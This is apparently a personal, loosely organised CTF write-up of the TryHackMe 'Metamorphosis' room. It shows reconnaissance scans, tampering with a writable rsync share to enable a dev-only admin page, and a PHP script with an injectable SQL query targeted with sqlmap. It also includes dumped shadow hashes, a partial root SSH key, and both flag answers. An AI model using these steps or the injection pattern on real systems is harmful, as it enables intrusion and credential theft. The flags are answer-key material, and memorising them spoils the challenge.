<h1 align="center">Metamorphosis</h1>
<p align="center">2025, August 3 - December 27 -  Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>. Access it <a href=https://tryhackme.com/room/metamorphosis>here </a>.<br>SQL Injection - SQLi - SQLMap - RCE</p>
<img width="1200px" src="https://github.com/user-attachments/assets/c05b72d5-f50c-487f-a40b-a8873ecf36d5"></p>

<br>
<h1>This is NOT  an walkthrough.<br>I am very dissapointed with TryHackMe platform. Not just because of this room. There are many rooms that simply do not load for me, or VM´s that disconnects all the time. Rankings criteria change without any notification. Rooms are deleted and new ones are created exactly the same. ...</h1>

<h2>Task 1 . Challenge</h2>
<p>Part of Incognito 2.0 CTF<br>

Like my work, Follow on twitter to be updated and know more about my work! (@0cirius0)</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>4ce794a9d0019c1f684e07556821e0b0</code></strong><br>
<p></p>


> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <strong><code>7ffca2ec63534d165525bf37d91b4ff4</code></strong><br>
<p></p>


```bash
:~# nmap -sC -sV -Pn -n -p- -T4 10.64.169.208
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-27 22:10 GMT
Nmap scan report for 10.64.169.208
Host is up (0.00023s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
873/tcp open  rsync       (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-27T22:10:58
|_  start_date: N/A
```



```bash
:~# rsync -rdt rsync://10.64.169.208:873
Conf           	All Confs
```

```bash
:~# rsync -rdt rsync://10.64.169.208:873/Conf
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
```

```bash
:~# rsync -av rsync://10.64.169.208:873/Conf ./rsync
receiving incremental file list
created directory ./rsync
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  129,743.33 bytes/sec
total size is 193,430  speedup is 0.99
```

```bash
:~# ls
burp.json  CTFBuilder  Desktop  Downloads  Instructions  Pictures  Postman  Rooms  rsync  Scripts  snap  thinclient_drives  Tools
:~# cd rsync
```

```bash
:~/rsync# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
root@ip-10-64-77-252:~/rsync# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
root@ip-10-64-77-252:~/rsync# nano webapp.ini
root@ip-10-64-77-252:~/rsync# rsync -av rsync/webapp.ini rsync://10.64.169.208:873/Conf/webapp.ini
sending incremental file list
rsync: change_dir "/root/rsync//rsync" failed: No such file or directory (2)

sent 20 bytes  received 12 bytes  64.00 bytes/sec
total size is 0  speedup is 0.00
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1205) [sender=3.1.3]
```

```bash
:~/rsync# cd ..
```

```bash
:~# rsync -av rsync/webapp.ini rsync://10.64.169.208:873/Conf/webapp.ini
sending incremental file list
webapp.ini

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```


```bash
:/etc# cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1000:1001::/home/tom:/bin/bash
systemd-timesync:x:112:117:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:113:120:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:114:121::/nonexistent:/usr/sbin/nologin
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:116:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1001:1003:Ubuntu:/home/ubuntu:/bin/bash
```

```bash
:/etc# cat shadow
root:$6$.s4ZfxA1$qG9HkQfhQ/bhGm4DvI5b8tT69Q2h5bw19YV5alffNk7wiFovz/vfHCQc0LYn9bGr5aculH3fPgmBb3ttHt/8d/:18727:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18726:0:99999:7:::
mysql:!:18726:0:99999:7:::
tom:$6$rPuUAh1D$EIQwGFqsL3xzP5u3EqKpBio2zcH0tVS1uforFmaykAPzNoBrTN/9z1cLkDt0VbhWz3srpiXdTMQfcBvDxeQDE0:18727:0:99999:7:::
systemd-timesync:*:20204:0:99999:7:::
tss:*:20204:0:99999:7:::
tcpdump:*:20204:0:99999:7:::
usbmux:*:20204:0:99999:7:::
fwupd-refresh:*:20204:0:99999:7:::
systemd-coredump:!!:20204::::::
ubuntu:!:20449:0:99999:7:::
```


```bash
tom@...:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       incognito
```

```bash
:/var/log$ ss -tnulp
Netid          State           Recv-Q          Send-Q                         Local Address:Port                      Peer Address:Port          Process          
udp            UNCONN          0               0                              127.0.0.53%lo:53                             0.0.0.0:*                              
udp            UNCONN          0               0                         10.64.169.208%ens5:68                             0.0.0.0:*                              
udp            UNCONN          0               0                              10.64.191.255:137                            0.0.0.0:*                              
udp            UNCONN          0               0                              10.64.169.208:137                            0.0.0.0:*                              
udp            UNCONN          0               0                                    0.0.0.0:137                            0.0.0.0:*                              
udp            UNCONN          0               0                              10.64.191.255:138                            0.0.0.0:*                              
udp            UNCONN          0               0                              10.64.169.208:138                            0.0.0.0:*                              
udp            UNCONN          0               0                                    0.0.0.0:138                            0.0.0.0:*                              
tcp            LISTEN          0               70                                 127.0.0.1:33060                          0.0.0.0:*                              
tcp            LISTEN          0               50                                   0.0.0.0:445                            0.0.0.0:*                              
tcp            LISTEN          0               128                                  0.0.0.0:22                             0.0.0.0:*                              
tcp            LISTEN          0               50                                   0.0.0.0:139                            0.0.0.0:*                              
tcp            LISTEN          0               151                                127.0.0.1:3306                           0.0.0.0:*                              
tcp            LISTEN          0               5                                    0.0.0.0:873                            0.0.0.0:*                              
tcp            LISTEN          0               4096                           127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               50                                      [::]:445                               [::]:*                              
tcp            LISTEN          0               128                                     [::]:22                                [::]:*                              
tcp            LISTEN          0               511                                        *:80                                   *:*                              
tcp            LISTEN          0               50                                      [::]:139                               [::]:*                              
tcp            LISTEN          0               5                                       [::]:873                               [::]:*  
```

```bash
tom@...:~$/home/tom# ls -lah
total 36K
drwxr-xr-x 5 tom  tom  4.0K Jun  9  2021 .
drwxr-xr-x 4 root root 4.0K Dec 27 22:08 ..
lrwxrwxrwx 1 tom  tom     9 Jun  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3.7K Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4.0K Apr 10  2021 .cache
drwx------ 3 tom  tom  4.0K Apr 10  2021 .gnupg
drwxrwxr-x 3 tom  tom  4.0K Apr 10  2021 .local
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
```



```bash
:/var/www/html# ls
admin  inde.html  index.php
```

```bash
:/var/www/html/admin# ls
config.php  index.php

:/var/www/html# cat index.php
<?php

$doc = new DOMDocument();
$doc -> loadHTMLFile("./inde.html");
echo $doc->saveHTML();
echo "1";
?>
```

```bash
:/var/www/html/admin# cat index.php
<?php

$ini = parse_ini_file('/var/confs/webapp.ini');

if($ini['env']=='dev'){

echo "<html><head><div style='text-align:center'><h1 style='text-align:center'>Get Info of users</h1><form action='config.php' method='POST'>Username: <input type='text' name='username'/><input type='submit'/></form><br><h4>TODO: Add more features</div> <head></html>";
}
else{
echo "<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>";
}

?>
```

```bash
:/var/backups# ps -eo user,command
...
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
www-data /usr/sbin/apache2 -k start
```



```bash
:/var/www/html/admin# cat config.php
<?php
$ini = parse_ini_file('/var/confs/webapp.ini');
if($ini['env']=='dev'){
$query=$_POST["username"];
$mysqli = new mysqli("localhost","dev","password","db");
if ($mysqli -> connect_errno) {
  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
  exit();
}
if ($result = $mysqli -> query('SELECT * FROM users where uname="'.$query.'"')) {
  while( $row = $result->fetch_array() )
{
    echo "Username Password<br>";
    echo $row['uname'] . " " . $row['password'];
    echo "<br />";
}
  // Free result set
  $result -> free_result();
}
}
else{
echo "";
}
?>
```



```bash
:/home/tom# cat user.txt
4ce794a9d0019c1f684e07556821e0b0
```



```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
...
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
```



```bash
:~# ssh -i i root@10.64.169.208
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 27 Dec 2025 11:57:59 PM UTC

  System load:  0.23              Processes:             128
  Usage of /:   69.4% of 8.76GB   Users logged in:       0
  Memory usage: 42%               IPv4 address for ens5: 10.64.169.208
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun May 11 18:50:54 2025 from 10.23.8.228
root@...:~#  ls
req.sh  root.txt  serv.py  snap
```

```bash
root@...:~# cat root.txt
7ffca2ec63534d165525bf37d91b4ff4
```








<img width="1126" height="248" alt="image" src="https://github.com/user-attachments/assets/6e10922e-0714-4fbc-af70-df18b97babd7" />


<h1  align="center">Vulnerability Scanning<a id='1'></h1>


```bash
:~# nikto -h 10.201.70.130
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.70.130
+ Target Hostname:    10.201.70.130
+ Target Port:        80
+ Start Time:         2025-10-07 21:12:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /admin/config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-07 21:12:43 (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```





<h1  align="center">Port Scanning<a id='2'></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.41              |
| `139`              |                      |Microsoft Windows netbios-ssn    | 
| `445`              |                      |                                 | 
| `873`              |                      |rsync                            | 

</p></div><br>


```bash
:~/Metamorphosis# nmap -A -vv 10.201.70.130
...
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
873/tcp open  rsync       syn-ack ttl 64 (protocol version 31)
..
Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11034/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51363/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 24304/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34541/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-07T20:11:50
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 10.201.70.130
```


```bash
:~# gobuster dir -u http://10.201.70.130/ -w /usr/share/dirb/wordlists/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.70.130/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/admin                (Status: 301) [Size: 314] [--> http://10.201.70.130/admin/]
/index.php            (Status: 500) [Size: 0]
...
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

```bash
:~# dirsearch -u http://10.10.49.104 -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_10.10.49.104/_xx-xx-xx_xx-xx-xx.txt

Target: http://10.201.70.130/

[21:16:44] Starting: 
[21:16:52] 301 -  314B  - /admin  ->  http://10.10.49.104/admin/
[21:16:52] 200 -  129B  - /admin/
[21:16:52] 200 -    0B  - /admin/config.php
[21:16:53] 200 -  129B  - /admin/index.php

Task Completed
```


```bash
:~/Metamorphosis# nc -nv 10.10.49.104 873
Connection to 10.201.70.130 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
Conf           	All Confs
@RSYNCD: EXIT
```

```bash
:~/Metamorphosis# rsync -av --list-only rsync://10.10.160.167:873
Conf           	All Confs
```

```bash
rsync -av --list-only rsync://10.10.49.104/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```




:~/Metamorphosis# rsync -av rsync://10.10.49.104:873/Conf challenge
receiving incremental file list
created directory challenge
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99



:~/Metamorphosis/challenge# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini



:~/Metamorphosis/challenge# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No




:~/Metamorphosis/challenge# nano webapp.ini



:~/Metamorphosis/challenge# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No



:~/Metamorphosis/challenge# rsync -av webapp.ini rsync://10.10.160.167:873/Conf/webapp.ini
sending incremental file list

sent 68 bytes  received 12 bytes  160.00 bytes/sec
total size is 71  speedup is 0.89





:~/Metamorphosis/challenge# rsync -av webapp.ini rsync://10.10.49.104:873/Conf/webapp.ini
sending incremental file list
webapp.ini

sent 186 bytes  received 41 bytes  151.33 bytes/sec
total size is 71  speedup is 0.31



:~/Metamorphosis/challenge# rsync -avH webapp.ini rsync://10.10.49.104:873/Conf/
sending incremental file list

sent 68 bytes  received 12 bytes  160.00 bytes/sec
total size is 71  speedup is 0.89












sqlmap -u http://$TARGET/admin/config.php --data "username=FUZZ" --level 5 --dbs




<img width="1254" height="169" alt="image" src="https://github.com/user-attachments/assets/93ea17f2-777f-494e-adb0-3ce5fa2e3b69" />




```bash
:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

<img width="1246" height="372" alt="image" src="https://github.com/user-attachments/assets/256cf80a-3284-4974-92f8-189ddb18f24c" />


```bash
:~/Metamorphosis# rsync -av rsync://10.10.160.167/Conf conf
receiving incremental file list
created directory conf
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  129,743.33 bytes/sec
total size is 193,430  speedup is 0.99
```

<img width="1136" height="319" alt="image" src="https://github.com/user-attachments/assets/f8e646c7-b3e8-4e40-817a-92d988fec185" />

<br>

```bash
:~/Metamorphosis/conf# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
```

```bash
:~/Metamorphosis/Challenge# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis/Challenge# nano webapp.ini
```

```bash
:~/Metamorphosis/Challenge# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

:~/Metamorphosis/conf# rsync -avH webapp.ini rsync://10.10.160.167:873/Conf
sending incremental file list

sent 68 bytes  received 12 bytes  160.00 bytes/sec
total size is 71  speedup is 0.89






```bash
:~/Metamorphosis/conf# rsync -av webapp.ini rsync://10.10.160.167/Conf/webapp.ini
sending incremental file list
webapp.ini

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<img width="1136" height="127" alt="image" src="https://github.com/user-attachments/assets/79edbb3e-c1b4-4795-9e38-0f6240d42a2d" />


<p>Navigate to  10.201.70.130/admin/</p>

<img width="1133" height="290" alt="image" src="https://github.com/user-attachments/assets/41e393c7-8716-4e54-abdb-97524d66de1b" />

<p>View page source</p>

<img width="1128" height="163" alt="image" src="https://github.com/user-attachments/assets/2859796c-a3e0-49eb-a185-2e368eb69d49" />

<p>bluezone.ini</p>

```bash
[BlueZone]

RegistrationKey=

;0-Application Settings in HKEY_LOCAL_MACHINE, Session Settings in HKEY_CURRENT_USER

;1-All Settings in HKEY_LOCAL_MACHINE

;2-All Settings in HKEY_CURRENT_USER (default mode)

BaseRegistry=2

UsePersonalFolderAsWorkingDir=Yes

UseAllUsersCommonFolderAsWorkingDir=No

ProfileMode=Yes

Web2HostModeStatusMsg=Cache Message: The BlueZone Web Administrator has posted files for updating ... please wait.

Web2HostModeStatusTitle=Web-to-Host Control

;DesktopMode=desktop.ini

DesktopModeStatusMsg=Desktop Mode: The BlueZone Web Administrator has posted updated files for installation ... please wait.

DesktopModeStatusTitle=Web-to-Host Control

 

[HLLAPI]

ConnectRetryMilliseconds=0
...

[Configuration Lock Feature]

Lock=0

LockFTP=0

 

[Support]

Line1=

Line2=

Line3=To contact Seagull Software Customer Support please visit our web site

Line4=

Line5=at: http://www.seagullsoftware.com and follow the "Customer Care" link

Line6=

Line7=which can be found under the main "Services and Support" category.
...
```

<p>ldap.cpnf</p>

```bash
#
# LDAP Defaults
#

# See ldap.conf(5) for details
# This file should be world readable but not world writable.

#BASE	dc=example,dc=com
#URI	ldap://ldap.example.com ldap://ldap-master.example.com:666

#SIZELIMIT	12
#TIMELIMIT	15
#DEREF		never

# TLS certificates (needed for GnuTLS)
TLS_CACERT	/etc/ssl/certs/ca-certificates.crt
```

<p>mysql.ini</p>

```bash
# MySQL Server Instance Configuration File
...
# CLIENT SECTION
...
[client]

port=3306

[mysql]

default-character-set=utf8
...
# SERVER SECTION
...
[mysqld]
#skip-innodb

# The TCP/IP Port the MySQL Server will listen on
port=3306
max_allowed_packet=16M
...
```

<p>access.conf</p>

```bash
# Login access control table.
#
# Comment line must start with "#", no space at front.
# Order of lines is important.
#
# When someone logs in, the table is scanned for the first entry that
# matches the (user, host) combination, or, in case of non-networked
# logins, the first entry that matches the (user, tty) combination.  The
# permissions field of that table entry determines whether the login will
# be accepted or refused.
#
# Format of the login access control table is three fields separated by a
# ":" character:
#
# [Note, if you supply a 'fieldsep=|' argument to the pam_access.so
# module, you can change the field separation character to be
# '|'. This is useful for configurations where you are trying to use
# pam_access with X applications that provide PAM_TTY values that are
# the display variable like "host:0".]
#
# 	permission : users : origins
#
# The first field should be a "+" (access granted) or "-" (access denied)
# character.
#
# The second field should be a list of one or more login names, group
# names, or ALL (always matches). A pattern of the form user@host is
# matched when the login name matches the "user" part, and when the
# "host" part matches the local machine name.
#
# The third field should be a list of one or more tty names (for
# non-networked logins), host names, domain names (begin with "."), host
# addresses, internet network numbers (end with "."), ALL (always
# matches), NONE (matches no tty on non-networked logins) or
# LOCAL (matches any string that does not contain a "." character).
#
# You can use @netgroupname in host or user patterns; this even works
# for @usergroup@@hostgroup patterns.
#
# The EXCEPT operator makes it possible to write very compact rules.
#
# The group file is searched only when a name does not match that of the
# logged-in user. Both the user's primary group is matched, as well as
# groups in which users are explicitly listed.
# To avoid problems with accounts, which have the same name as a group,
# you can use brackets around group names '(group)' to differentiate.
# In this case, you should also set the "nodefgroup" option.
#
# TTY NAMES: Must be in the form returned by ttyname(3) less the initial
# "/dev" (e.g. tty1 or vc/1)
#
##############################################################################
#
# Disallow non-root logins on tty1
#
#-:ALL EXCEPT root:tty1
#
# Disallow console logins to all but a few accounts.
#
#-:ALL EXCEPT wheel shutdown sync:LOCAL
#
# Same, but make sure that really the group wheel and not the user
# wheel is used (use nodefgroup argument, too):
#
#-:ALL EXCEPT (wheel) shutdown sync:LOCAL
#
# Disallow non-local logins to privileged accounts (group wheel).
#
#-:wheel:ALL EXCEPT LOCAL .win.tue.nl
#
# Some accounts are not allowed to login from anywhere:
#
#-:wsbscaro wsbsecr wsbspac wsbsym wscosor wstaiwde:ALL
#
# All other accounts are allowed to login from anywhere.
#
##############################################################################
# All lines from here up to the end are building a more complex example.
##############################################################################
#
# User "root" should be allowed to get access via cron .. tty5 tty6.
#+ : root : cron crond :0 tty1 tty2 tty3 tty4 tty5 tty6
#
# User "root" should be allowed to get access from hosts with ip addresses.
#+ : root : 192.168.200.1 192.168.200.4 192.168.200.9
#+ : root : 127.0.0.1
#
# User "root" should get access from network 192.168.201.
# This term will be evaluated by string matching.
# comment: It might be better to use network/netmask instead.
#          The same is 192.168.201.0/24 or 192.168.201.0/255.255.255.0
#+ : root : 192.168.201.
#
# User "root" should be able to have access from domain.
# Uses string matching also.
#+ : root : .foo.bar.org
#
